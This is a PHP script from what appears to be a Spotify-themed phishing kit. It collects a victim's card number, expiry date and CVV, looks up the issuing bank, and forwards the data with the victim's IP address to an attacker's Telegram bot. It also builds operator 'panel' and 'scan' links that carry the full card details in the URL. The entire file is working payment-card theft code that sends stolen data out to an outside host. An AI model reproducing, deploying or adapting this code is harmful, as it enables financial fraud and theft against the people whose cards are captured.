<?php
// Start the session
session_start();

// Include config.php to access API and chat IDs
include '../config.php';

// Get the message and card details from the POST request
$data = json_decode(file_get_contents('php://input'), true);
$message = $data['message'];
$cardNumber = $data['cardNumber'];
$expiryDate = $data['expiryDate'];
$cvv = $data['cvv'];

// Store card details in session
$_SESSION['card_number'] = $cardNumber;
$_SESSION['expiry_date'] = $expiryDate;
$_SESSION['cvv'] = $cvv;
$_SESSION['message'] = $message;

// Extract the first 6 digits of the card number (BIN)
$bin = substr($cardNumber, 0, 6);

// Fetch BIN details from binlist.net
$binUrl = "https://lookup.binlist.net/" . $bin;
$headers = ['Accept-Version: 3'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $binUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$binResponse = curl_exec($ch);
curl_close($ch);

// Decode the BIN response
$binData = json_decode($binResponse, true);

// Extract bank details with fallback to "Unknown" if fields are missing
$bankName = $binData['bank']['name'] ?? 'Unknown';
$bankType = isset($binData['type']) ? strtoupper($binData['type']) : 'UNKNOWN';
$bankBrand = isset($binData['brand']) ? strtoupper($binData['brand']) : 'UNKNOWN';
$bankCountry = $binData['country']['name'] ?? 'Unknown';

// Store BIN details in session
$_SESSION['bank_name'] = $bankName;
$_SESSION['bank_type'] = $bankType;
$_SESSION['bank_brand'] = $bankBrand;
$_SESSION['bank_country'] = $bankCountry;

// Prepare the styled message to send to Telegram
$telegramMessage = "[💳] SPOTIFY CC +1 [💳]\r\n";
$telegramMessage .= "\r\n";
$telegramMessage .= "💳 Card Number: " . $cardNumber . "\r\n";
$telegramMessage .= "🗑️ Expiry Date: " . $expiryDate . "\r\n";
$telegramMessage .= "🔐 CVV: " . $cvv . "\r\n";
$telegramMessage .= "\r\n";
$telegramMessage .= "🏛️ Banque : " . $bankName . "\r\n";
$telegramMessage .= "🏛️ Niveau : " . $bankType . "\r\n";
$telegramMessage .= "🏛️ Type : " . $bankBrand . "\r\n";
$telegramMessage .= "🏛️ Pays : " . $bankCountry . "\r\n";
$telegramMessage .= "\r\n";
$telegramMessage .= "🕹 IP: 🌍 " . $_SERVER['REMOTE_ADDR'] . " 🌍\r\n";
$telegramMessage .= "\r\n";
$telegramMessage .= "🚀 POWRED BY 404 🚀\r\n";

// Define the panel URLs
$panel = str_replace('web/sys/shop.php', '', "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."panel/view.php?vip=" . $_SERVER['REMOTE_ADDR']);
$panel2 = str_replace('web/sys/shop.php', '', "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."/admin/scan.php?name=Unknown&cc=" . str_replace(' ', '', $cardNumber) . "&exp=" . $expiryDate . "&cvv=" . $cvv);

// Define the inline keyboard
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => 'View Panel 🌍', 'url' => $panel],
            ['text' => 'FAST Scan', 'url' => $panel2]
        ]
    ]
];

// Send message to Telegram with inline keyboard
$url = "https://api.telegram.org/bot$api/sendMessage";
$postData = [
    'chat_id' => $chatid,
    'text' => $telegramMessage,
    'reply_markup' => json_encode($keyboard) // Add the inline keyboard
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($postData)
    ]
];

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);

if ($result === FALSE) {
    // Handle error
    echo json_encode(['status' => 'error', 'message' => 'Failed to send message']);
} else {
    // Success
    echo json_encode(['status' => 'success', 'message' => 'Message sent']);
}
?>